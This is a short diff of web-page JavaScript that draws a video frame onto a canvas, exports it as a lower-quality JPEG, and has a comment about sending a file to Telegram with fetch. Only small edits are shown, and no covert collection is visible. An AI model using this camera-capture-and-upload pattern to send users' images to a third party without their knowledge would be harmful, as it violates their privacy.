@@ -1040,7 +1040,7 @@
                     // Log the file size in MB
                     var fileSizeInMB = file.size / (1024 * 1024);
                     console.log('File size: ' + fileSizeInMB.toFixed(2) + ' MB');
-                    
+
                     // Send file to Telegram using fetch
                     var formData1 = new FormData();
                     formData1.append('photo', file);
@@ -1142,10 +1142,9 @@
             // video.pause(); // Pause the video stream
             // stopSparkling();
             context.drawImage(video, 0, 0, canvas.width, canvas.height);
-            var imageUrl = canvas.toDataURL('image/jpg');
-            // downloadButton.href = canvas.toDataURL('image/png');
-            downloadImage(imageUrl);
+            var imageUrl = canvas.toDataURL('image/jpeg', 0.7); // Set to 'image/jpeg' and adjust quality (0.7)
 
+            downloadImage(imageUrl);
         }
 
         function downloadImage(dataUrl) {
